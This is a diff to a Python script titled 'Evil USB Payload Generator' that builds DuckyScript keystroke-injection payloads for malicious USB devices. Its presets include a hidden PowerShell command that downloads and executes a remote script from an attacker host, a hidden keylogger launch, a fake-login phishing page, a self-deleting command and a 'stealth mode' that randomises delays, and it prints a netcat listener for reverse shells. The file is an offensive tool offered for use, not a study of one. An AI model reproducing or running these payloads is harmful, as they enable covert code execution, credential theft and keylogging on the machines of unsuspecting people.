@@ -1,33 +1,31 @@
-# evil_usb_generator.py
-
 import os
-from datetime import datetime
 import random
 import re
 
+# Predefined payloads
 PAYLOADS = {
-    "reverse_shell": '''
+    "reverse_shell": r'''
 DELAY 1000
 GUI r
 DELAY 300
-STRING powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')\"
+STRING powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
 ENTER
 ''',
-    "keylogger": '''
+    "keylogger": r'''
 DELAY 1000
 GUI r
 DELAY 300
-STRING powershell -WindowStyle hidden -c \"Start-Process 'logger.exe'\"
+STRING powershell -WindowStyle hidden -c "Start-Process 'logger.exe'"
 ENTER
 ''',
-    "open_website": '''
+    "open_website": r'''
 DELAY 1000
 GUI r
 DELAY 300
 STRING start https://fake-login.example.com
 ENTER
 ''',
-    "wifi_reconfig": '''
+    "wifi_reconfig": r'''
 DELAY 1000
 GUI r
 DELAY 300
@@ -43,13 +41,16 @@ DELAY 300
 STRING powershell -nop -w hidden -c "Start-Sleep -s 3; Remove-Item -Path $MyInvocation.MyCommand.Path -Force"
 ENTER
 '''
-
 }
 
 def list_payloads():
-    print("Available Payloads:")
-    for i, name in enumerate(PAYLOADS, 1):
-        print(f"[{i}] {name.replace('_', ' ').title()}")
+    print("\nAvailable Payloads:")
+    for i, key in enumerate(PAYLOADS.keys(), 1):
+        print(f"[{i}] {key.replace('_', ' ').title()}")
+
+def get_payload_by_choice(choice):
+    keys = list(PAYLOADS.keys())
+    return PAYLOADS.get(keys[choice - 1], "")
 
 def apply_stealth_mode(payload):
     lines = payload.strip().splitlines()
@@ -60,85 +61,70 @@ def apply_stealth_mode(payload):
             new_lines.append(f"DELAY {random.randint(50, 250)}")
     return "\n".join(new_lines)
 
-def contains_dangerous_commands(payload):
-    dangerous_patterns = [r'remove-item', r'shutdown', r'format', r'rd /s /q']
-    for pattern in dangerous_patterns:
+def detect_dangerous_commands(payload):
+    patterns = [r'remove-item', r'shutdown', r'format', r'rd /s /q']
+    for pattern in patterns:
         if re.search(pattern, payload, re.IGNORECASE):
             return True
     return False
 
-def payload_stats(payload):
+def show_payload_stats(payload):
     lines = payload.strip().splitlines()
     delay_count = sum(1 for line in lines if line.startswith("DELAY"))
     string_count = sum(1 for line in lines if line.startswith("STRING"))
-    total_lines = len(lines)
     print("\n--- Payload Stats ---")
-    print(f"Total lines: {total_lines}")
+    print(f"Total lines: {len(lines)}")
     print(f"STRING commands: {string_count}")
     print(f"DELAY commands: {delay_count}")
-    print(f"Estimated time (ms): {sum(int(line.split()[1]) for line in lines if line.startswith('DELAY'))}")
-    print("----------------------\n")
+    print(f"Estimated time (ms): {delay_count * 300}")
+    print("----------------------")
 
-def generate_listener_instructions(payload):
-    if 'DownloadString' in payload and 'http' in payload:
+def check_for_reverse_shell(payload):
+    if 'nc' in payload.lower() or 'iex' in payload.lower():
         print("\n[!] This looks like a reverse shell payload. Example listener:")
-        print("    nc -lvnp 4444\n")
+        print("    nc -lvnp 4444")
 
-def generate_payload(content, filename):
+def save_payload(payload):
+    filename = input("\nSave as (e.g., payload.txt): ").strip()
     with open(filename, 'w') as f:
-        f.write(content)
-    print(f"[+] Payload saved as {filename}")
+        f.write(payload)
+    print(f"Payload saved to {filename}")
 
 def main():
     print("Evil USB Payload Generator")
     print("[1] Use preset payload")
     print("[2] Write custom payload")
-    try:
-        mode = int(input("Choose an option (1 or 2): "))
-        if mode == 1:
-            list_payloads()
-            choice = int(input("\nSelect a payload number to generate: "))
-            keys = list(PAYLOADS.keys())
-            if 1 <= choice <= len(keys):
-                content = PAYLOADS[keys[choice - 1]]
-            else:
-                print("[!] Invalid choice.")
-                return
-        elif mode == 2:
-            print("Enter your custom DuckyScript below (end with an empty line):")
-            lines = []
-            while True:
-                line = input()
-                if line.strip() == "":
-                    break
-                lines.append(line)
-            content = "\n".join(lines)
-        else:
-            print("[!] Invalid mode selected.")
+    choice = input("Choose an option (1 or 2): ").strip()
+
+    if choice == '1':
+        list_payloads()
+        try:
+            selection = int(input("\nSelect a payload number to generate: "))
+            payload = get_payload_by_choice(selection)
+        except (ValueError, IndexError):
+            print("Invalid selection.")
             return
+    elif choice == '2':
+        print("\nEnter your custom payload (end with Ctrl+D or Ctrl+Z):")
+        try:
+            payload = "\n".join(iter(input, ""))
+        except EOFError:
+            pass
+    else:
+        print("Invalid option.")
+        return
 
-        stealth = input("Enable stealth mode? (y/n): ").lower()
-        if stealth == 'y':
-            content = apply_stealth_mode(content)
+    if input("Enable stealth mode? (y/n): ").lower() == 'y':
+        payload = apply_stealth_mode(payload)
 
-        # Payload statistics
-        payload_stats(content)
+    show_payload_stats(payload)
 
-        # Dangerous command warning
-        if contains_dangerous_commands(content):
-            confirm = input("[!] Dangerous command detected! Are you sure you want to save it? (y/n): ").lower()
-            if confirm != 'y':
-                print("[!] Payload creation aborted.")
-                return
+    if detect_dangerous_commands(payload):
+        print("\n[!] Warning: Destructive command detected in payload!")
 
-        # Listener suggestion
-        generate_listener_instructions(content)
+    check_for_reverse_shell(payload)
 
-        default_name = f"payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-        filename = input(f"Enter output filename [default: {default_name}]: ") or default_name
-        generate_payload(content, filename)
-    except ValueError:
-        print("[!] Invalid input. Please enter a number.")
+    save_payload(payload)
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
